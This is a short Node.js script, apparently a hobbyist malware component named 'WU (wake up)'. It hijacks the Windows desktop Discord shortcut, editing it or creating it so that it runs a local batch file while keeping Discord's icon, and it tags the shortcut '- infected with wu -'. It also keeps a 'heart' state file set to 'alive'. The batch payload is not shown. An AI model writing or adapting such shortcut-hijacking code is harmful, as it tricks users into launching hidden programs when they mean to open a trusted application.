console.log("starting WU (wake up)");
const fs = require("fs");
var ws = require('windows-shortcuts');

const dataP = __dirname.replace('act', 'data');

const idp = __dirname.replace('act', 'handle\\Discord\\idiscord.bat');
const idicon = __dirname.replace('act', 'handle\\Discord\\id.ico');
const workingP = __dirname.replace('Desktop\\WAKE UP\\act', '');
// C:\Users\litkid\AppData\Roaming

const desktopP = __dirname.replace('WAKE UP\\act', '');

function infectD(){
  if (fs.existsSync(desktopP+"\\Discord.lnk")) {
    //found a discord shortcut
    //going to edit it
    ws.edit(desktopP+"\\Discord.lnk", {
      target: idp,
      desc: "- infected with wu -",
      workingDir: 'C:\\Users\\litkid\\Desktop\\WAKE UP\\handle\\Discord',
      icon: idicon
    });
  }else{
    ws.create(desktopP+"\\Discord.lnk", {
      target: idp,
      desc: "- infected with wu -",
      workingDir: 'C:\\Users\\litkid\\Desktop\\WAKE UP\\handle\\Discord',
      icon: idicon
    });
  }
}


//make sure wu is alive.
console.log(fs.readFileSync(dataP+"/heart.wu").toString());
if (fs.readFileSync(dataP+"/heart.wu").toString().includes("dead")){
  //wu is dead, resurrecting
  console.log("- wu is dead, resurrecting -");

  fs.writeFile(dataP+'/heart.wu', "alive", 'utf-8', function(err, data) {
    if (err) throw err;
  });
}else{
  console.log("- wu is alive -");
}

fs.readdir(dataP+'/dna', (err, files) => {
  files.forEach(file => {
    if (file == 'desktop.wu'){
      //desktop enabled
    }
    if (file == 'discord.wu'){
      infectD();
      console.log("runnning");
    }
  });
});
